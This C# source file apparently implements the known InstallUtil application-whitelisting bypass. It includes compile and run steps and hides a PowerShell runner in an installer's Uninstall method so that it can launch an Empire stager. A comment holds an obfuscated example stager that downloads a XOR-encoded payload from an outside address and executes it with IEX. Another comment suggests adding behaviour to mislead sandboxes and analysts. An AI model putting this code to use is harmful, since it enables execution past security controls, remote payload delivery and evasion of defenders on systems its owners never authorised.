using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
 
//Add For PowerShell Invocation
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
 
 
/*
Author: Casey Smith, Twitter: @subTee
 
License: BSD 3-Clause
Step One:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:"C:\Program Files\Reference Assemblies\Microsoft\WindowsPowerShell\3.0\System.Management.Automation.dll" /out:Empire.exe Empire.cs
Step Two:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Empire.exe
 
*/
 
    public class Program
    {
        public static void Main()
        {
            Console.WriteLine("Hello From Main...I Don't Do Anything");
            //Add any behaviour here to throw off sandbox execution/analysts :)
             
        }
         
    }
     
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
             
            while(true)
            {
                //INSERT STAGER SCRIPT HERE
                //example 
                //string x = "$wC=NeW-ObJECt SysteM.NeT.WEBCLiEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERS.ADD('User-Agent',$u);$WC.PRoxy = [SyStem.NEt.WEBREqUESt]::DEfAUltWEbProxy;$wc.PROxy.CreDentiAlS = [SYstEM.NeT.CRedENtIalCache]::DefAUlTNEtWoRKCrEdeNtiALS;$K='3cc31cd246149aec68079241e71e98f6';$I=0;[cHaR[]]$B=([ChAr[]]($wC.DowNLOAdStrIng("http://192.168.56.102:8080/index.asp")))|%{$_-BXoR$K[$I++%$K.LEnGth]};IEX ($b-jOIN'')";
                //Be sure to properly escape, or encode the string.
                //Thats it!
                string x = "[INSERT STAGER SCRIPT HERE]";
                RunPSCommand(x);
            }
             
        }
     
    //Based on Jared Atkinson's And Justin Warner's Work
    public static string RunPSCommand(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
 
            //Add commands
            pipeline.Commands.AddScript(cmd);
 
            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
 
            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
         }
          
          
    }